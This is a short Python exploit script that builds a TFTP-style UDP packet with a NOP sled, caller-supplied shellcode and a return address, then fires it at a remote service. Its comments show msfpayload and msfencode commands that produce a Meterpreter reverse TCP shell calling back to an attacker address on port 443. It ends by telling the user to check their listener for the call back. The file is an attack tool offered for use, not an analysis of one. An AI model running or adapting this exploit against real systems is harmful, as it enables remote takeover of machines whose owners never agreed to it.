# Remote UDP Exploit
# Written by Patrick Lismore ( @patricklismore )
# Supports launching of payloads against a remote UDP service
 
import socket, sys
 
# ** Usage: remoteUdpExploit.py <Target IP Address> <Target Port> <Attacking IP Address> <returnAddress> <shellCode>
 
targethost = sys.argv[1]		# Assign Target IP from user input
targetport = int(sys.argv[2])	# Assign Target Port from user input

localhost = sys.argv[3]         # Attacking machine

ret = sys.argv[4] 	    # Return address - Source Metasploit (Little Endian)
nop = "\x90" * (25-len(localhost))	# Create a NOP string up to 25 bytes

#Use the following to generate a payload >> msfpayload windows/meterpreter/reverse_nonx_tcp LHOST=192.168.1.2 LPORT=443 EXITFUNC=process R > payload
#cat shellcode | msfencode -b '\x00' -e x86/shaikata_ga_nai -t python
#[*] x86/shikata_ga_nai succeeded with size 210 (iteration=1)
 
buf =  sys.argv[5]
 
exploit = "\x00\x02" + nop + buf + ret + "\x83\xc4\x28\xc3\x00netascii\x00"

print("Openning UDP Socket")
udpclient = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	# Setup a UDP socket
print("Sending UDP Exploit")
udpclient.sendto(exploit, (targethost, targetport))		        # Send the exploit over UDP socket to the target address
print("Exploit Delivered - check for call back to your listener that you should have already had listening")